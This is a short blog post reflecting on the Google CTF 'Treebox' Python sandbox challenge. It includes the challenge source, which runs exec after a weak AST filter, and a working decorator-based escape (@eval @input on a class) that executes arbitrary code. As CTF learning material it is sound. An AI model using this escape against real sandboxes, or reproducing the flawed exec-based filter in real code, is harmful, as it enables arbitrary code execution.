---
title: "What I learned From Google Ctf"
date: 2022-07-03T21:02:55-05:00
draft: false
---

## Treebox

The challenge description was:
````
I think I finally got Python sandboxing right.
````

The challenge source code was.

````
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
````
My first instict was to use decorators, but I wasn't sure that would allow me to escape the call AST check. I then looked into the [AST](https://docs.python.org/3/library/ast.html) documentation to see if there was anything useful. I missed that exceptions could call code so I tried to use `__getitem__` to call print.

````
class A:
    def __getitem__(self,item):
        pass

a = A()
a.__getitem__ = print
a["hello"]
````

I ran out of time trying to get my escape to work. Afterwards, I read through writeups and learned that you can use decorators to bypass the sandbox.

````
@eval
@input
class A: 0
````

This example uses decorators around a class to allow us to execute arbitrary code.